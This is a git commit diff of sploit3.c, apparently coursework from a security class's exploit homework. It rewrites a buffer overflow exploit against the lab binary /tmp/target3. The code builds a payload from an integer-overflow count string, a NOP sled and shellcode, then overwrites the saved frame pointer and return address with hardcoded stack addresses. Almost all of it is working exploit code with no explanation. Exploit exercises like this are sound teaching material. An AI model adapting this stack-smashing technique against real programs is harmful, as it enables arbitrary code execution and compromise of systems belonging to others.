15ec2e30cab1375747e9093f9be175cc5c39aa0d
Shawn Zhong <github@shawnzhong.com>
2020-04-13 08:07:45 -0500

    Update sploit3.c

--- HW4/sploits/sploit3.c
+++ HW4/sploits/sploit3.c
@@ -6,22 +6,19 @@
 
 #define TARGET "/tmp/target3"
 #define NOP 0x90
+#define TARGET_SIZE 160 * 16
 
 int main(void) {
   char *args[3];
   char *env[1];
 
-  char *count_str = "-2147483487,";
-  int count_len = strlen(count_str);
-  int shell_len = strlen(shellcode);
+  char buf[12 + TARGET_SIZE + 8 + 1] = "-2147483487,"; // (1 << 31) + 161
+  memset(buf + strlen(buf), NOP, TARGET_SIZE);
 
-  char buf[count_len + 161 * 16];
-  memset(buf, NOP, sizeof(buf));
-
-  memcpy(buf, count_str, count_len);
-  memcpy(buf + count_len + 160 * 16 - shell_len, shellcode, shell_len);
-  strcpy(buf + count_len + 160 * 16, "\x78\xf4\xff\xbf"   // sfp
-                                     "\x48\xea\xff\xbf"); // ret
+  char* end = buf + sizeof(buf) - 8 - 1;
+  strcpy(end - strlen(shellcode), shellcode);
+  strcpy(end, "\x78\xf4\xff\xbf"   // sfp
+              "\x48\xea\xff\xbf"); // ret
 
   args[0] = TARGET;
   args[1] = buf;
